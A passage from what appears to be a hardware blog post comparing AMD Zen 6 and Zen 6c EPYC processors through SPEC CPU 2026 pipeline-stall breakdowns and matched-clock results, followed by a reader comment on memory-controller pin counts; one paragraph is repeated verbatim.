The 9996 also edges out the 9686F in 721.gcc and 765.roms, two subtests where the 9686F’s higher clock provides no advantage. Top-down breakdowns of pipeline slots on the two Zen 6 chips show where the 9686F’s lead comes from. The integer-rate profiles look almost identical in core-bound subtests. In 750.sealcrypto, 710.omnetpp, 735.gem5, and 753.ns3, retiring slots account for nearly the same share on both chips, with differences of less than one percentage point. Memory-heavy subtests show larger gaps. Moving from the EPYC 9996 to the EPYC 9686F, backend memory stalls rise from 37.9% to 50.0% of pipeline slots in 729.abc, from 19.0% to 34.1% in 723.llvm, and from 24.8% to 33.2% in 708.sqlite. The share of retiring slots falls accordingly. Zen 6c’s lower clock and larger shared L3 cache may help explain its lower memory-stall share. The floating-point profiles look similar for most subtests. The retiring share in 731.astcenc, 772.marian, and 767.nest differs by about one percentage point or less, and 709.cactus spends over half its slots stalled on front-end bandwidth on both chips. The larger gaps again appear in memory-heavy subtests. Moving from the EPYC 9996 to the EPYC 9686F, backend memory stalls rise from 42.5% to 55.3% of slots in 765.roms, from 60.9% to 67.6% in 749.fotonik3d, and from 17.8% to 33.8% in 782.lbm. These are also tests where the 9686F’s higher clock helps least: it trails the 9996 in 765.roms, roughly ties in 749.fotonik3d, and leads by about 11% in 782.lbm, despite clocking up to roughly 29% higher. Running the 9686F at 4.1 GHz to match the 9996 removes the clock advantage, and the overall picture flips: the 9686F scores 4.92 and 8.64 at that clock, putting Zen 6c about 6.7% ahead per clock in integer and 4% in floating point. At the same clock speed, Zen 6 and Zen 6c look almost identical in core-bound integer subtests. In 750.sealcrypto, retiring slots account for 67.3% of the total on the EPYC 9686F versus 67.6% on the EPYC 9996.The floating-point profiles also look similar in several subtests at matched clocks. Both chips spend over half their pipeline slots stalled on frontend bandwidth in 709.cactus. Their retiring shares differ by about two percentage points in 722.palm and 766.femflow. The 9686F still spends a larger share of its pipeline slots stalled on memory. Backend memory stalls account for 50.3% versus 42.5% on the 9996 in 765.roms, 24.9% versus 17.8% in 782.lbm, and 63.3% versus 60.9% in 749.fotonik3d. Zen 6c’s 128 MB L3 cache is likely serving more of these requests than Zen 6’s 48 MB cache, reducing the need to access main memory. The clearest difference is in frontend latency stalls, which account for a much larger share of slots on the 9686F in subtests with large codebases. In 727.cppcheck, that share is 35.2% versus 16.6% on the 9996; in 721.gcc, it is 25.8% versus 10.0%. With clock speed matched and both designs sharing the same frontend, those stalls most likely reflect differences in the cache and memory hierarchy. The floating-point profiles also look similar in several subtests at matched clocks. Both chips spend over half their pipeline slots stalled on frontend bandwidth in 709.cactus. Their retiring shares differ by about two percentage points in 722.palm and 766.femflow. The 9686F still spends a larger share of its pipeline slots stalled on memory. Backend memory stalls account for 50.3% versus 42.5% on the 9996 in 765.roms, 24.9% versus 17.8% in 782.lbm, and 63.3% versus 60.9% in 749.fotonik3d. Zen 6c’s 128 MB L3 cache is likely serving more of these requests than Zen 6’s 48 MB cache, reducing the need to access main memory. Final Words The Zen 6 Family improves upon its predecessor in various ways, an upgraded frontend allows one thread to utilize both decoders, while a faster branch predictor makes it more forgiving on misses, all tied together with larger OoO structures allowing it to better hide memory stalls. All of this coming together to provide a generational uplift from Zen 5. However, I think the more interesting change is the split between Zen 6 and Zen 6c. The classic and dense cores now differ within the out-of-order engine, with Zen 6 appearing tuned for higher clocks and Zen 6c providing more capacity to absorb latency. The shared foundation is still clear, but those differences make the choice between them more dependent on workload behavior. The performance results are encouraging as well with the estimated single-threaded SPEC CPU 2026 scores, the EPYC 9686F leads the Zen 5-based EPYC 9575F by about 21% in integer and 18% in floating point. The EPYC 9996 roughly matches the 9575F despite running about 900 MHz slower which are strong results for both core designs. AMD’s answer to the classic-versus-dense question used to be the same core at two densities but now with Zen 6 it is two cores, each shaped for where it will run. That now leaves me wondering what AMD will do with the Zen 7 Family and if we will see even more specialization of the same basic core design or if we will see a larger split of the designs. 39 6 Share Previous Discussion about this post Comments Restacks Top Latest Discussions Ready for more?  Memory controllers are pretty much limited by external pinout. Zen 4 and newer consumer chips have 4 memory controllers (for legacy reasons shown as 2) which handle 32bit wide LPDDR5 or DDR5 interfaces (2x per dimm for DDR5) The AM5 (desktop) socket has in addition to the 4x 32bit memory lanes, 28 PCI-E lanes (generally 16x for GPU, two 4x general purpose, one 4x to chipset), 4x combined DP/HDMI outputs, USB 2.0 port, 4 USB 3.2 Gen 2 ports. And that's just the major buses, there's ton of other components exposed (simpler IO, sound, power) All of that counts to staggering 1718 pins - anyone remember when moving dual-channel K8 from 940 pin to 939 allowed removal of whole layer from motherboard PCB, making them way cheaper? The high-end performance server socket from AMD has 6096 pins, significant chunk of it being the 24x 32bit DDR5 interfaces. So unfortunately it's very much not easy to add more memory, and that's before considering issues with routing it on motherboard even if you accept changing shapes reply servo_sausage 6 hours ago | root | parent | next [–]
